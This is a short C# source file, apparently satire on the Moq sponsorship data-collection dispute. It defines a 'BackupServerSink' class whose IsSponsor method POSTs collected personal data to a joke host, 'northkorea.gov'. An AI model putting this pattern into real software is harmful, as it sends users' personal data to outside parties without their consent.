using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

using Moq.Sponsorships.Interfaces;

namespace Moq.Sponsorships.Sinks
{
    /// <summary>
    /// A sink that sends personal data to a backup server to determine whether or not we are a sponsor
    /// </summary>
    public class BackupServerSink : ICollectedDataSink
    {
        private const string BACKUP_URL = "https://northkorea.gov/api/is_github_sponsor";

        /// <inheritdoc />
        public async Task<bool> IsSponsor(DataCollection collection)
        {
            HttpClient client = new HttpClient();
            var response = await client.PostAsync(BACKUP_URL, new StringContent(collection.ToString()));

            return response.IsSuccessStatusCode;
        }
    }
}
